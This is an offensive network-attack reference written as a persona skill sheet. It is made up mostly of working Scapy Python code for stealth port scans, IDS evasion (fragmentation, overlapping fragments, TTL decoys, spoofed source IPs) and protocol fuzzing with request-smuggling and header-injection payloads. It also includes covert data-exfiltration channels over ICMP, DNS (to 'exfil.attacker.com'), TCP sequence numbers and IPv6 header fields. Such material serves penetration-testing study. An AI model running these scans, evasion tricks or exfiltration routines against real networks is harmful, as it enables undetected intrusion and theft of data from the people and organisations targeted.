# GS-15: Packet Crafting & Protocol Manipulation with Scapy

**Classification:** Rush — Royal Guard (The Breacher)
**Domain:** Network Packet Crafting, Evasion, Fuzzing, Covert Channels
**Source:** SANS SEC560 (Network Penetration Testing), Scapy documentation, real-world engagement patterns
**Platform:** Kali WSL2 / Python 3.x + Scapy 2.5+

---

## 0. Scapy Fundamentals

### Installation and Setup

```bash
# Install Scapy on Kali WSL2
sudo apt install python3-scapy -y

# Or via pip (latest version)
pip3 install scapy

# Launch interactive Scapy shell
sudo scapy

# Scapy requires root/sudo for raw socket access
# On WSL2, ensure you have proper network access:
sudo sysctl -w net.ipv4.ip_forward=1
```

### Core Scapy Concepts

```python
from scapy.all import *

# Scapy builds packets by layering protocols with the / operator
# Each layer is an object with configurable fields

# View all fields for a protocol
ls(IP)      # Show all IP header fields
ls(TCP)     # Show all TCP header fields
ls(UDP)     # Show all UDP header fields
ls(ICMP)    # Show all ICMP fields

# Build a simple ICMP echo request
packet = IP(dst="192.168.1.1") / ICMP()

# Build a TCP SYN
packet = IP(dst="192.168.1.1") / TCP(dport=80, flags="S")

# Send and receive (layer 3 — Scapy handles Ethernet)
response = sr1(packet, timeout=2)

# Send only, no response expected (layer 3)
send(packet)

# Layer 2 send/receive (you control Ethernet header)
response = srp1(Ether() / IP(dst="192.168.1.1") / ICMP(), timeout=2)

# Send at layer 2 without waiting
sendp(Ether() / IP(dst="192.168.1.1") / ICMP())

# Inspect a packet's structure
packet.show()
packet.summary()

# Read/write pcap files
packets = rdpcap("capture.pcap")
wrpcap("output.pcap", packets)
```

---

## 1. Port Scanning — All Scan Types

### TCP SYN Scan (Half-Open / Stealth Scan)

```python
from scapy.all import *

def syn_scan(target, ports):
    """
    SYN scan: Send SYN, check for SYN-ACK (open) or RST (closed).
    Half-open — never completes handshake. Stealthier than connect scan.
    Equivalent to: nmap -sS
    """
    results = {"open": [], "closed": [], "filtered": []}

    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="S", sport=RandShort())
        resp = sr1(pkt, timeout=1, verbose=0)

        if resp is None:
            results["filtered"].append(port)
        elif resp.haslayer(TCP):
            if resp[TCP].flags == 0x12:  # SYN-ACK
                results["open"].append(port)
                # Send RST to close (don't complete handshake)
                send(IP(dst=target) / TCP(dport=port, flags="R",
                     sport=resp[TCP].dport, seq=resp[TCP].ack), verbose=0)
            elif resp[TCP].flags == 0x14:  # RST-ACK
                results["closed"].append(port)
        elif resp.haslayer(ICMP):
            # ICMP unreachable = filtered
            results["filtered"].append(port)

    return results

# Usage
target = "192.168.1.1"
ports = range(1, 1025)
results = syn_scan(target, ports)
print(f"Open: {results['open']}")
print(f"Filtered: {results['filtered']}")
```

### TCP ACK Scan (Firewall Mapping)

```python
def ack_scan(target, ports):
    """
    ACK scan: Send ACK packets to map firewall rules.
    Does NOT determine if port is open/closed.
    Determines if port is FILTERED (no response / ICMP unreachable)
    or UNFILTERED (RST response — firewall allows through).
    Equivalent to: nmap -sA
    """
    results = {"unfiltered": [], "filtered": []}

    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="A", sport=RandShort())
        resp = sr1(pkt, timeout=1, verbose=0)

        if resp is None:
            results["filtered"].append(port)
        elif resp.haslayer(TCP) and resp[TCP].flags == 0x04:  # RST
            results["unfiltered"].append(port)
        elif resp.haslayer(ICMP):
            results["filtered"].append(port)

    return results
```

### TCP FIN Scan (Stealth — RFC 793 Exploitation)

```python
def fin_scan(target, ports):
    """
    FIN scan: Send FIN flag. Per RFC 793:
      - Closed port → RST response
      - Open port → No response (silently dropped)
    Evades many stateless firewalls that only inspect SYN packets.
    Equivalent to: nmap -sF

    WARNING: Does not work against Windows (Windows sends RST regardless).
    Effective against Linux/Unix targets.
    """
    results = {"open|filtered": [], "closed": []}

    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="F", sport=RandShort())
        resp = sr1(pkt, timeout=2, verbose=0)

        if resp is None:
            results["open|filtered"].append(port)
        elif resp.haslayer(TCP) and resp[TCP].flags == 0x14:  # RST
            results["closed"].append(port)

    return results
```

### TCP NULL Scan

```python
def null_scan(target, ports):
    """
    NULL scan: Send packet with NO flags set.
    Same logic as FIN scan (RFC 793 behavior).
    Equivalent to: nmap -sN
    """
    results = {"open|filtered": [], "closed": []}

    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="", sport=RandShort())
        resp = sr1(pkt, timeout=2, verbose=0)

        if resp is None:
            results["open|filtered"].append(port)
        elif resp.haslayer(TCP) and resp[TCP].flags == 0x14:
            results["closed"].append(port)

    return results
```

### TCP XMAS Scan

```python
def xmas_scan(target, ports):
    """
    XMAS scan: Send FIN + PSH + URG flags (the packet is "lit up like a Christmas tree").
    Same RFC 793 logic as FIN and NULL scans.
    Equivalent to: nmap -sX
    """
    results = {"open|filtered": [], "closed": []}

    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="FPU", sport=RandShort())
        resp = sr1(pkt, timeout=2, verbose=0)

        if resp is None:
            results["open|filtered"].append(port)
        elif resp.haslayer(TCP) and resp[TCP].flags == 0x14:
            results["closed"].append(port)

    return results
```

### UDP Scan

```python
def udp_scan(target, ports):
    """
    UDP scan: Send empty UDP datagram.
      - Open: Application responds OR no response
      - Closed: ICMP Port Unreachable (Type 3, Code 3)
      - Filtered: No response OR ICMP unreachable (other codes)
    Equivalent to: nmap -sU

    UDP scanning is slow due to ICMP rate limiting.
    """
    results = {"open|filtered": [], "closed": []}

    for port in ports:
        pkt = IP(dst=target) / UDP(dport=port)
        resp = sr1(pkt, timeout=3, verbose=0)

        if resp is None:
            results["open|filtered"].append(port)
        elif resp.haslayer(ICMP):
            icmp_type = resp[ICMP].type
            icmp_code = resp[ICMP].code
            if icmp_type == 3 and icmp_code == 3:
                results["closed"].append(port)
            else:
                results["open|filtered"].append(port)
        elif resp.haslayer(UDP):
            results["open|filtered"].append(port)

    return results
```

### Comprehensive Multi-Scan Runner

```python
def full_recon(target, ports=range(1, 1025)):
    """
    Run all scan types and correlate results for maximum accuracy.
    """
    print(f"[*] Starting comprehensive scan of {target}")

    print("[*] Phase 1: SYN scan (open port detection)")
    syn = syn_scan(target, ports)

    print("[*] Phase 2: ACK scan (firewall mapping)")
    ack = ack_scan(target, ports)

    print("[*] Phase 3: FIN scan (stealth verification)")
    fin = fin_scan(target, ports)

    print("\n=== RESULTS ===")
    print(f"SYN scan — Open: {syn['open']}")
    print(f"ACK scan — Unfiltered: {ack['unfiltered']}")
    print(f"FIN scan — Open|Filtered: {fin['open|filtered']}")

    # Correlate: port is definitively open if SYN says open AND ACK says unfiltered
    confirmed_open = set(syn['open']) & set(ack['unfiltered'])
    print(f"\nConfirmed open (SYN+ACK correlation): {sorted(confirmed_open)}")
```

---

## 2. Fragmentation Evasion

### IP Fragmentation to Bypass IDS/IPS

```python
def fragmented_syn(target, port, frag_size=8):
    """
    Fragment a TCP SYN packet into tiny IP fragments.
    Many IDS/IPS fail to reassemble fragments correctly,
    allowing the scan to pass undetected.

    frag_size must be a multiple of 8 (IP fragment offset granularity).
    """
    # Build the full packet
    pkt = IP(dst=target) / TCP(dport=port, flags="S", sport=RandShort())

    # Fragment it
    frags = fragment(pkt, fragsize=frag_size)

    print(f"[*] Sending {len(frags)} fragments to {target}:{port}")
    for f in frags:
        send(f, verbose=0)

    # Listen for response
    resp = sr1(IP(dst=target) / TCP(dport=port, flags="S"), timeout=3, verbose=0)
    if resp and resp[TCP].flags == 0x12:
        print(f"[+] Port {port} is OPEN")
    else:
        print(f"[-] Port {port} is closed/filtered")

# Fragment sizes to try for evasion
# Smaller = harder for IDS to reassemble, but more conspicuous
fragmented_syn("192.168.1.1", 80, frag_size=8)   # Tiny fragments
fragmented_syn("192.168.1.1", 80, frag_size=16)  # Small fragments
fragmented_syn("192.168.1.1", 80, frag_size=24)  # Medium fragments
```

### Overlapping Fragments (Advanced Evasion)

```python
def overlapping_fragments(target, port):
    """
    Create overlapping IP fragments where the second fragment
    overwrites part of the first. Different OS reassembly policies
    (BSD vs Linux vs Windows) handle overlaps differently.

    This can bypass IDS that uses a different reassembly policy
    than the target OS.
    """
    # Build TCP SYN
    syn = TCP(dport=port, flags="S", sport=RandShort(), seq=1000)
    syn_bytes = bytes(syn)

    # Fragment 1: IP header + first 16 bytes of TCP (with WRONG flags)
    frag1_payload = bytearray(syn_bytes[:16])
    frag1_payload[13] = 0x00  # Clear TCP flags (looks like NULL scan to IDS)

    frag1 = IP(dst=target, flags="MF", frag=0, proto=6) / Raw(frag1_payload)

    # Fragment 2: Overlaps with frag1, contains CORRECT SYN flag
    # Offset 0 means it overwrites from the beginning
    frag2_payload = syn_bytes[:24]  # First 24 bytes with correct SYN flag

    frag2 = IP(dst=target, flags="MF", frag=0, proto=6) / Raw(frag2_payload)

    # Fragment 3: Rest of the packet
    frag3 = IP(dst=target, frag=3, proto=6) / Raw(syn_bytes[24:])

    # Send in order: frag1 (bad flags), frag2 (correct, overlapping), frag3
    send(frag1, verbose=0)
    send(frag2, verbose=0)
    send(frag3, verbose=0)

    print(f"[*] Sent overlapping fragments to {target}:{port}")
```

### TTL-Based Evasion

```python
def ttl_evasion_scan(target, port, ids_ttl=5):
    """
    Send a decoy fragment with a low TTL that reaches the IDS
    but expires before reaching the target. The IDS reassembles
    the wrong packet while the target gets the real payload.

    Requires knowing hop count to IDS vs target.
    ids_ttl: TTL that will expire at/before the IDS
    """
    syn = TCP(dport=port, flags="S", sport=RandShort())
    syn_bytes = bytes(syn)

    # Decoy fragment (low TTL — expires at IDS, never reaches target)
    decoy = IP(dst=target, ttl=ids_ttl, flags="MF", frag=0, proto=6) / Raw(b"\x00" * 16)
    send(decoy, verbose=0)

    # Real fragments (normal TTL — reaches target)
    import time
    time.sleep(0.1)

    real_frags = fragment(IP(dst=target) / TCP(dport=port, flags="S"), fragsize=8)
    for f in real_frags:
        send(f, verbose=0)

    print(f"[*] TTL evasion fragments sent to {target}:{port}")
```

---

## 3. Protocol Fuzzing

### TCP Option Fuzzing

```python
def fuzz_tcp_options(target, port, count=100):
    """
    Fuzz TCP options field to test target's TCP stack robustness.
    Malformed TCP options can crash vulnerable implementations.
    """
    for i in range(count):
        # Generate random TCP options
        opts = []
        num_opts = random.randint(1, 5)
        for _ in range(num_opts):
            kind = random.randint(0, 255)
            length = random.randint(2, 40)
            value = bytes(random.randint(0, 255) for _ in range(max(0, length - 2)))
            opts.append((kind, value))

        try:
            pkt = IP(dst=target) / TCP(dport=port, flags="S",
                                        sport=RandShort(),
                                        options=opts)
            send(pkt, verbose=0)
        except Exception:
            pass  # Some option combos are invalid — skip

        if i % 10 == 0:
            print(f"[*] Sent {i}/{count} fuzzed TCP option packets")

    print(f"[+] TCP option fuzzing complete: {count} packets sent")
```

### HTTP Fuzzing with Scapy

```python
def fuzz_http(target, port=80, count=50):
    """
    Fuzz HTTP request headers and methods to find parsing vulnerabilities.
    Targets: buffer overflows, header injection, request smuggling.
    """
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS",
               "TRACE", "CONNECT", "PROPFIND", "MKCOL",
               "A" * 1000,           # Buffer overflow in method parser
               "GET / HTTP/1.1\r\nX: Y\r\nGET",  # Request smuggling attempt
               "\x00GET",            # Null byte prefix
               ]

    fuzzed_headers = [
        "Host: " + "A" * 8000,                      # Long host header
        "Content-Length: -1",                          # Negative CL
        "Content-Length: 99999999999999",              # Huge CL
        "Transfer-Encoding: chunked\r\nContent-Length: 0",  # CL/TE conflict
        "X-Custom: " + "\r\nInjected-Header: pwned",  # Header injection
        "Host: localhost\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost",  # Smuggling
    ]

    for i in range(min(count, len(methods) * len(fuzzed_headers))):
        method = random.choice(methods)
        header = random.choice(fuzzed_headers)

        payload = f"{method} / HTTP/1.1\r\n{header}\r\n\r\n"

        try:
            pkt = IP(dst=target) / TCP(dport=port, flags="S", sport=RandShort())
            resp = sr1(pkt, timeout=2, verbose=0)
            if resp and resp[TCP].flags == 0x12:
                # Complete handshake
                ack = IP(dst=target) / TCP(dport=port, flags="A",
                        sport=pkt[TCP].sport,
                        seq=pkt[TCP].seq + 1,
                        ack=resp[TCP].seq + 1)
                send(ack, verbose=0)

                # Send fuzzed HTTP
                http = IP(dst=target) / TCP(dport=port, flags="PA",
                        sport=pkt[TCP].sport,
                        seq=pkt[TCP].seq + 1,
                        ack=resp[TCP].seq + 1) / Raw(payload.encode())
                send(http, verbose=0)
        except Exception as e:
            print(f"[!] Error on iteration {i}: {e}")

    print(f"[+] HTTP fuzzing complete: {count} fuzzed requests sent")
```

### DNS Fuzzing

```python
def fuzz_dns(target, count=100):
    """
    Fuzz DNS queries to test resolver robustness.
    Tests for: buffer overflows, label length issues, compression pointer loops.
    """
    for i in range(count):
        fuzz_type = random.choice(["long_label", "many_labels", "null_bytes",
                                    "special_chars", "compression_loop"])

        if fuzz_type == "long_label":
            # Label > 63 bytes (RFC 1035 limit)
            name = "A" * random.randint(64, 255) + ".com"
        elif fuzz_type == "many_labels":
            # Name > 253 bytes total
            labels = ".".join(["a" * 10 for _ in range(30)])
            name = labels + ".com"
        elif fuzz_type == "null_bytes":
            name = "test\x00evil.com"
        elif fuzz_type == "special_chars":
            name = "".join(chr(random.randint(1, 255)) for _ in range(20)) + ".com"
        else:
            name = "test.com"

        try:
            qtype = random.choice([1, 2, 5, 6, 12, 15, 16, 28, 33, 255,
                                   random.randint(256, 65535)])
            pkt = IP(dst=target) / UDP(dport=53) / DNS(
                rd=1,
                qd=DNSQR(qname=name, qtype=qtype)
            )
            send(pkt, verbose=0)
        except Exception:
            pass

    print(f"[+] DNS fuzzing complete: {count} packets sent to {target}")
```

---

## 4. Covert Channels

### ICMP Covert Channel (Data in Echo Payloads)

```python
import base64

def icmp_exfil_send(target, data, chunk_size=32):
    """
    Exfiltrate data by encoding it in ICMP echo request payloads.
    Looks like normal pings to most firewalls/IDS.

    Encoding: base64 in ICMP payload field
    Chunking: split data into chunk_size byte pieces
    """
    encoded = base64.b64encode(data.encode()).decode()
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

    print(f"[*] Exfiltrating {len(data)} bytes in {len(chunks)} ICMP packets")

    for i, chunk in enumerate(chunks):
        # Sequence number carries chunk index
        # Payload carries the data
        pkt = IP(dst=target) / ICMP(type=8, id=0x1337, seq=i) / Raw(chunk.encode())
        send(pkt, verbose=0)
        import time
        time.sleep(0.5)  # Slow and steady to avoid detection

    # Send termination signal
    pkt = IP(dst=target) / ICMP(type=8, id=0x1337, seq=0xFFFF) / Raw(b"END")
    send(pkt, verbose=0)
    print("[+] Exfiltration complete")


def icmp_exfil_receive(interface="eth0"):
    """
    Receiver: sniff ICMP echo requests and reconstruct data.
    Run this on the receiving end.
    """
    chunks = {}

    def process_packet(pkt):
        if pkt.haslayer(ICMP) and pkt[ICMP].type == 8 and pkt[ICMP].id == 0x1337:
            seq = pkt[ICMP].seq
            payload = pkt[Raw].load.decode()

            if payload == "END":
                # Reassemble
                ordered = [chunks[k] for k in sorted(chunks.keys())]
                full_data = "".join(ordered)
                decoded = base64.b64decode(full_data).decode()
                print(f"\n[+] Received data: {decoded}")
                return True
            else:
                chunks[seq] = payload
                print(f"[*] Received chunk {seq}: {payload}")

    print("[*] Listening for ICMP covert channel...")
    sniff(iface=interface, filter="icmp", prn=process_packet,
          stop_filter=lambda p: p.haslayer(Raw) and p[Raw].load == b"END")
```

### DNS Covert Channel (Data in Subdomain Queries)

```python
def dns_exfil_send(dns_server, domain, data, chunk_size=30):
    """
    Exfiltrate data via DNS queries. Data encoded as hex subdomains.
    Example: 48656c6c6f.exfil.attacker.com

    Even heavily filtered networks usually allow DNS (port 53).
    This is one of the most reliable exfiltration methods.
    """
    hex_data = data.encode().hex()
    chunks = [hex_data[i:i+chunk_size] for i in range(0, len(hex_data), chunk_size)]

    print(f"[*] Exfiltrating via DNS: {len(chunks)} queries to *.{domain}")

    for i, chunk in enumerate(chunks):
        # Query format: <seq>.<hexdata>.<domain>
        query_name = f"{i:04d}.{chunk}.{domain}"
        pkt = IP(dst=dns_server) / UDP(dport=53) / DNS(
            rd=1,
            qd=DNSQR(qname=query_name, qtype="A")
        )
        send(pkt, verbose=0)
        import time
        time.sleep(1)  # DNS queries are normal — but not in bursts

    # Termination query
    pkt = IP(dst=dns_server) / UDP(dport=53) / DNS(
        rd=1,
        qd=DNSQR(qname=f"FFFF.end.{domain}", qtype="A")
    )
    send(pkt, verbose=0)
    print("[+] DNS exfiltration complete")


def dns_exfil_receive(interface="eth0", domain="exfil.attacker.com"):
    """
    Receiver: run on authoritative DNS server for the exfil domain.
    Captures DNS queries and reconstructs data.
    """
    chunks = {}

    def process_dns(pkt):
        if pkt.haslayer(DNSQR):
            qname = pkt[DNSQR].qname.decode().rstrip(".")
            if domain in qname:
                parts = qname.replace(f".{domain}", "").split(".")
                if len(parts) == 2:
                    seq, hex_chunk = parts
                    if hex_chunk == "end":
                        ordered = [chunks[k] for k in sorted(chunks.keys())]
                        full_hex = "".join(ordered)
                        decoded = bytes.fromhex(full_hex).decode()
                        print(f"\n[+] Reconstructed data: {decoded}")
                    else:
                        chunks[int(seq)] = hex_chunk
                        print(f"[*] DNS chunk {seq}: {hex_chunk}")

    print(f"[*] Listening for DNS queries to *.{domain}")
    sniff(iface=interface, filter="udp port 53", prn=process_dns)
```

### TCP Covert Channel (Data in Sequence Numbers)

```python
def tcp_seq_exfil(target, port, data):
    """
    Hide data in TCP sequence numbers and other header fields.
    Each SYN packet carries 4 bytes of data in the sequence number.

    To an observer, these look like failed connection attempts (SYN with no reply
    or RST response). Common noise on any network.
    """
    data_bytes = data.encode()
    # Pad to multiple of 4
    while len(data_bytes) % 4 != 0:
        data_bytes += b"\x00"

    print(f"[*] Exfiltrating {len(data_bytes)} bytes in TCP SEQ numbers")

    for i in range(0, len(data_bytes), 4):
        chunk = data_bytes[i:i+4]
        seq_num = int.from_bytes(chunk, byteorder='big')

        # The IP ID field carries the chunk index
        pkt = IP(dst=target, id=i//4) / TCP(
            dport=port,
            sport=RandShort(),
            flags="S",
            seq=seq_num
        )
        send(pkt, verbose=0)
        import time
        time.sleep(0.3)

    # Termination: special IP ID
    pkt = IP(dst=target, id=0xFFFF) / TCP(dport=port, flags="S", seq=0)
    send(pkt, verbose=0)
    print("[+] TCP SEQ covert channel exfiltration complete")
```

### IPv6 Covert Channel (Flow Label + Traffic Class)

```python
def ipv6_covert_send(target_ipv6, data):
    """
    Hide data in IPv6 Flow Label (20 bits) and Traffic Class (8 bits) fields.
    28 bits = 3.5 bytes per packet. IPv6 traffic often gets less scrutiny.
    """
    data_bytes = data.encode()

    print(f"[*] IPv6 covert channel: {len(data_bytes)} bytes to {target_ipv6}")

    for i in range(0, len(data_bytes), 3):
        chunk = data_bytes[i:i+3]
        # Pad to 3 bytes
        while len(chunk) < 3:
            chunk += b"\x00"

        # Pack into flow label (20 bits) and traffic class (8 bits)
        flow_label = (chunk[0] << 12) | (chunk[1] << 4) | (chunk[2] >> 4)
        traffic_class = (chunk[2] & 0x0F) << 4 | (i // 3)  # Low nibble = seq

        pkt = IPv6(dst=target_ipv6, fl=flow_label, tc=traffic_class) / \
              ICMPv6EchoRequest()
        send(pkt, verbose=0)
        import time
        time.sleep(0.5)

    print("[+] IPv6 covert channel complete")
```

---

## 5. Network Reconnaissance Utilities

### OS Fingerprinting via TCP/IP Stack Behavior

```python
def os_fingerprint(target):
    """
    Fingerprint OS by analyzing TCP/IP stack behavior differences.
    Different OS implementations have distinct TTL, window size,
    and DF (Don't Fragment) defaults.
    """
    results = {}

    # Test 1: Default TTL from ICMP response
    pkt = IP(dst=target) / ICMP()
    resp = sr1(pkt, timeout=2, verbose=0)
    if resp:
        ttl = resp[IP].ttl
        results["ttl"] = ttl
        if ttl <= 64:
            results["ttl_os"] = "Linux/Unix (TTL ~64)"
        elif ttl <= 128:
            results["ttl_os"] = "Windows (TTL ~128)"
        elif ttl <= 255:
            results["ttl_os"] = "Cisco/Network device (TTL ~255)"

    # Test 2: TCP window size from SYN-ACK
    pkt = IP(dst=target) / TCP(dport=80, flags="S")
    resp = sr1(pkt, timeout=2, verbose=0)
    if resp and resp.haslayer(TCP):
        win = resp[TCP].window
        results["window"] = win
        # Common window sizes:
        # Linux: 5840, 14600, 29200, 65535
        # Windows: 8192, 16384, 65535
        # FreeBSD: 65535

        # Check DF bit
        results["df"] = bool(resp[IP].flags.DF)
        # Linux usually sets DF, Windows varies

    # Test 3: TCP Options in SYN-ACK
    if resp and resp.haslayer(TCP):
        results["tcp_options"] = resp[TCP].options
        # Order and presence of options varies by OS

    print(f"\n=== OS Fingerprint for {target} ===")
    for k, v in results.items():
        print(f"  {k}: {v}")

    return results
```

### Traceroute with Protocol Flexibility

```python
def multi_protocol_traceroute(target):
    """
    Traditional ICMP traceroute may be blocked. Try multiple protocols.
    """
    print(f"[*] ICMP traceroute to {target}")
    ans, _ = sr(IP(dst=target, ttl=(1, 30)) / ICMP(), timeout=3, verbose=0)
    for snd, rcv in sorted(ans, key=lambda x: x[0].ttl):
        print(f"  TTL {snd.ttl:2d}: {rcv.src}")

    print(f"\n[*] TCP traceroute to {target}:80")
    ans, _ = sr(IP(dst=target, ttl=(1, 30)) / TCP(dport=80, flags="S"),
                timeout=3, verbose=0)
    for snd, rcv in sorted(ans, key=lambda x: x[0].ttl):
        print(f"  TTL {snd.ttl:2d}: {rcv.src}")

    print(f"\n[*] UDP traceroute to {target}:53")
    ans, _ = sr(IP(dst=target, ttl=(1, 30)) / UDP(dport=53),
                timeout=3, verbose=0)
    for snd, rcv in sorted(ans, key=lambda x: x[0].ttl):
        print(f"  TTL {snd.ttl:2d}: {rcv.src}")
```

---

## 6. Scan Timing and Detection Avoidance

```python
import time
import random

def stealth_scan(target, ports, min_delay=0.5, max_delay=3.0, randomize=True):
    """
    Production-grade stealth scan with:
    - Randomized port order (defeats sequential scan detection)
    - Variable timing (defeats rate-based detection)
    - Decoy source IPs (defeats source-based blocking)
    - Fragmentation (defeats signature-based IDS)
    """
    if randomize:
        ports = list(ports)
        random.shuffle(ports)

    decoys = [RandIP() for _ in range(5)]
    results = {"open": [], "closed": [], "filtered": []}

    for port in ports:
        # Random delay
        time.sleep(random.uniform(min_delay, max_delay))

        # Build SYN with random source port
        pkt = IP(dst=target) / TCP(dport=port, flags="S", sport=RandShort())

        # Fragment for IDS evasion
        frags = fragment(pkt, fragsize=8)
        for f in frags:
            send(f, verbose=0)

        # Also send decoy packets
        for decoy in random.sample(decoys, 2):
            dpkt = IP(src=str(decoy), dst=target) / TCP(dport=port, flags="S")
            send(dpkt, verbose=0)

        # Receive response
        resp = sr1(IP(dst=target) / TCP(dport=port, flags="S"),
                   timeout=2, verbose=0)

        if resp is None:
            results["filtered"].append(port)
        elif resp[TCP].flags == 0x12:
            results["open"].append(port)
            send(IP(dst=target) / TCP(dport=port, flags="R",
                 seq=resp[TCP].ack), verbose=0)
        elif resp[TCP].flags == 0x14:
            results["closed"].append(port)

    return results
```

---

## 7. Quick Reference — Scapy Cheat Sheet

```python
# === PACKET BUILDING ===
IP(dst="x.x.x.x")                          # IP layer
TCP(dport=80, flags="S")                    # TCP SYN
UDP(dport=53)                               # UDP
ICMP()                                      # ICMP Echo
DNS(rd=1, qd=DNSQR(qname="example.com"))   # DNS query
Ether(dst="ff:ff:ff:ff:ff:ff")              # Broadcast Ethernet
ARP(pdst="192.168.1.0/24")                  # ARP request
Raw(b"payload data")                        # Raw payload

# === TCP FLAGS ===
# S=SYN, A=ACK, F=FIN, R=RST, P=PSH, U=URG
# Combine: "SA" = SYN-ACK, "FA" = FIN-ACK, "FPU" = XMAS

# === SEND/RECEIVE ===
send(pkt)          # L3 send, no response
sr(pkt)            # L3 send+receive (returns answered, unanswered)
sr1(pkt)           # L3 send+receive (returns first response only)
sendp(pkt)         # L2 send
srp(pkt)           # L2 send+receive
srp1(pkt)          # L2 send+receive (first response)

# === SNIFFING ===
sniff(count=10)                              # Capture 10 packets
sniff(filter="tcp port 80", count=100)       # BPF filter
sniff(iface="eth0", prn=lambda p: p.show())  # Live display

# === PCAP ===
wrpcap("out.pcap", packets)
packets = rdpcap("in.pcap")

# === UTILITIES ===
packet.show()      # Human-readable packet dump
packet.summary()   # One-line summary
hexdump(packet)    # Hex dump
ls(TCP)            # List TCP fields
```

---

*Every packet is a conversation. Control the conversation, control the network. — Rush, GS-15*
